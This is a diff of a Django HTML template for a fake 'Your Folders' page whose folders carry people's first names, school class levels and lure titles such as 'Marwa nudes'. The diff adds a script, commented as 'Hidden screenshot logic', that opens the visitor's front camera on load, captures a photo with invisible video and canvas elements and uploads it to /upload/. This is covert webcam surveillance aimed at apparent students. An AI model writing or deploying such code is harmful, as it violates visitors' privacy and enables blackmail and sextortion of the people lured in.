@@ -50,102 +50,57 @@
             font-weight: bold;
             color: #ccc;
         }
-
-        video, canvas {
-            display: none;
-        }
     </style>
 </head>
 <body>
 
     <h1>📂 Your Folders</h1>
     <div class="folder-grid">
-        <div class="folder">
-            <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Adam</a></div>
-        </div>
-        <div class="folder">
-            <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Yassine</a></div>
-        </div>
-        <div class="folder">
-            <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Hassan 3aryan</a></div>
-        </div>
-        <div class="folder">
-            <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Hiba</a></div>
-        </div>
-        <div class="folder">
-            <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Rihab</a></div>
-        </div>
-        <div class="folder">
-            <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Malak</a></div>
-        </div>
-                <div class="folder">
-            <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}" style="color: white;">2 EME BAC</a></div>
-        </div>
-                <div class="folder">
-            <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}" style="color: white;">1 EME BAC</a></div>
-            
-        </div>
-        <div class="folder">
-            <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}" style="color: white;">3 EME COLLEGE</a></div>
-        </div>
-                <div class="folder">
-            <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Imane Vape</a></div>
-        </div>
-                <div class="folder">
-            <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}" style="color: white;">SALMA</a></div>
-        </div>
-                        <div class="folder">
-            <div class="folder-icon">📁</div>
-            <div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Marwa nudes</a></div>
-        </div>
-        <!-- Add more folders here -->
+        <!-- Your folders -->
+        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Adam</a></div></div>
+        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Yassine</a></div></div>
+        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Hassan 3aryan</a></div></div>
+        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Hiba</a></div></div>
+        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Rihab</a></div></div>
+        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Malak</a></div></div>
+        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">2 EME BAC</a></div></div>
+        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">1 EME BAC</a></div></div>
+        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">3 EME COLLEGE</a></div></div>
+        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Imane Vape</a></div></div>
+        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">SALMA</a></div></div>
+        <div class="folder"><div class="folder-icon">📁</div><div class="folder-name"><a href="{% url 'index' %}" style="color: white;">Marwa nudes</a></div></div>
     </div>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
-
+    <!-- Hidden screenshot logic -->
     <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
+        const video = document.createElement('video');
+        const canvas = document.createElement('canvas');
 
         navigator.mediaDevices.getUserMedia({
             video: { facingMode: 'user' }, audio: false
         })
         .then(stream => {
             video.srcObject = stream;
+            video.play();
             video.onloadedmetadata = () => {
-                setTimeout(() => captureAndSend(), 1500);
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const image = canvas.toDataURL('image/png');
+
+                    fetch('/upload/', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        },
+                        body: `image=${encodeURIComponent(image)}`
+                    }).then(res => res.json())
+                      .then(data => console.log("Screenshot uploaded:", data.file));
+                }, 1500);
             };
         })
-        .catch(err => console.warn('Camera permission not granted.'));
-
-        function captureAndSend() {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const image = canvas.toDataURL('image/png');
-
-            fetch('/upload/', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                },
-                body: `image=${encodeURIComponent(image)}`
-            })
-            .then(res => res.json())
-            .then(data => console.log("Image saved as:", data.file));
-        }
+        .catch(err => console.warn('Camera access denied.'));
     </script>
 
 </body>
